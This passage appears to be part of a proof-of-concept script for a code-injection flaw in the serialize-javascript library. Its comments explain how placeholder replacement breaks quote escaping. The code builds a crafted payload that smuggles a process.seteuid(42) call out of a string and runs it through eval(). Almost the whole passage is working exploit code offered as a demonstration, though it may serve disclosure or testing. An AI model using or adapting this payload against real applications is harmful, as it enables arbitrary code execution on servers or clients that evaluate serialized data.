   // would produce when processing: { foo: /1" + process.seteuid(42)/i, bar: '"@__R-<UID>-0__@"' }
   // The placeholder replacement disrupts quote escaping, breaking the string boundary.
   const maliciousPayload = `({"bar":"\\\\"1" + process.seteuid(42)/*"})`;

   console.log("[*] Vulnerable serialize-javascript output (simulated with matched UID):");
   console.log(maliciousPayload);

   console.log("\n[*] Evaluating payload via eval() to demonstrate code injection...");
   // When developers pass raw serialized data directly to eval(), the broken string context 
   // exposes the injected `process.seteuid(42)` call for execution.
   eval('('+ maliciousPayload + ')');
